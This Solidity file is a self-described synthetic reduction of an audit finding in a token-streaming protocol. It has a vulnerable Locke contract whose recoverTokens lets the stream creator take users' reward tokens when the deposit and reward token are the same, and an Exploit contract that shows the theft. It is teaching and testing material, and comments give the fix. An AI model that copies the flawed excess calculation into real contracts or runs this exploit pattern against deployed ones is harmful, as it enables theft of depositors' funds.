// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Streaming Protocol — Tokens can be stolen when depositToken == rewardToken
    (Code4rena 2021-11-streaming, finding #42394, H-02, reporter cmichel et al.)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Locke.recoverTokens' deposit branch computes
        excess = balance - (depositTokenAmount - redeemedDepositTokens)
    When depositToken == rewardToken the live balance also holds the reward
    inventory, so that "excess" includes (rewardTokenAmount + fees). The stream
    creator recovers user-funded rewards as if they were stray deposits, and
    depositors can no longer claim those rewards.

    (The deposit branch returns early, so the reward branch is unreachable for
    the same address — the concrete, code-faithful harm is reward theft via the
    deposit excess formula.)

    Harm: creator steals 500 reward tokens that were still owed to depositors.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name = "SAME";
    string public symbol = "SAME";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Locke stream — recoverTokens with the same-token excess bug.
contract Locke {
    address public streamCreator;
    address public depositToken;
    address public rewardToken;
    uint256 public depositTokenAmount;
    uint256 public redeemedDepositTokens;
    uint256 public rewardTokenAmount;
    uint256 public rewardTokenFeeAmount;
    uint256 public endDepositLock; // 0 => already unlocked
    uint256 public endRewardLock;

    bool private locked;

    modifier lock() {
        require(!locked, "LOCKED");
        locked = true;
        _;
        locked = false;
    }

    constructor(address creator_, address token_) {
        streamCreator = creator_;
        depositToken = token_;
        rewardToken = token_; // SAME token
        endDepositLock = 0;
        endRewardLock = 0;
    }

    /// @dev Seed accounting + balances: 1000 deposit outstanding, 500 reward funded.
    function seed(uint256 depositAmt, uint256 rewardAmt) external {
        depositTokenAmount = depositAmt;
        redeemedDepositTokens = 0;
        rewardTokenAmount = rewardAmt;
        rewardTokenFeeAmount = 0;
        MockERC20(depositToken).mint(address(this), depositAmt + rewardAmt);
    }

    /**
     *  @dev Faithful reduction of Locke.recoverTokens (Streaming/src/Locke.sol).
     */
    function recoverTokens(address token, address recipient) public lock {
        // NOTE: it is the stream creators responsibility to save
        // tokens on behalf of their users.
        require(msg.sender == streamCreator, "!creator");
        if (token == depositToken) {
            require(block.timestamp > endDepositLock, "time");
            // get the balance of this contract
            // check what isnt claimable by either party
            // @audit-info depositTokenAmount updated on stake/withdraw/exit
            // @> VULN: when depositToken == rewardToken, balance includes rewards,
            // so excess = (dep+rew) - dep = rew — creator steals user rewards.
            // FIX: if (token == depositToken && token == rewardToken) subtract
            // both (depositTokenAmount - redeemedDepositTokens) AND
            // (rewardTokenAmount + rewardTokenFeeAmount).
            uint256 excess = MockERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);
            // allow saving of the token
            MockERC20(token).transfer(recipient, excess);

            return;
        }

        if (token == rewardToken) {
            require(block.timestamp > endRewardLock, "time");
            // check what isnt claimable by depositors and governance
            uint256 excess = MockERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);
            MockERC20(token).transfer(recipient, excess);

            return;
        }
    }
}

contract Exploit {
    MockERC20 public token; // CREATE nonce 1
    Locke public stream; // CREATE nonce 2

    uint256 public constant DEPOSIT = 1000;
    uint256 public constant REWARD = 500;

    constructor() {
        token = new MockERC20();
        // Exploit is the stream creator.
        stream = new Locke(address(this), address(token));
        stream.seed(DEPOSIT, REWARD);
    }

    function run() external {
        uint256 creatorBefore = token.balanceOf(address(this));
        require(token.balanceOf(address(stream)) == DEPOSIT + REWARD, "seed bal");
        require(stream.depositToken() == stream.rewardToken(), "same token setup");

        // Creator recovers "excess" deposits — which silently includes all rewards.
        stream.recoverTokens(address(token), address(this));

        uint256 stolen = token.balanceOf(address(this)) - creatorBefore;
        // HARM: 500 reward tokens stolen; depositors can no longer claim rewards.
        require(stolen == REWARD, "should steal full reward inventory");
        require(token.balanceOf(address(stream)) == DEPOSIT, "only deposits should remain");
        // Reward accounting still claims 500 are owed, but the tokens are gone.
        require(stream.rewardTokenAmount() == REWARD, "accounting still expects rewards");
    }
}
